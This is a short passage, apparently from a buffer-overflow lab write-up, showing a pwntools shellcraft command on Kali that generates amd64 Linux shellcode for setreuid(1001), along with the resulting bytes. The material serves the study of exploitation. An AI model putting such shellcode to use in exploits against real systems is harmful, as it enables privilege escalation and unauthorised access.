
We can get the code for setreuid
```sh
┌──(kali㉿kali)-[~/bof]
└─$ pwn shellcraft --format d amd64.linux.setreuid 1001
\x31\xff\x66\xbf\xe9\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

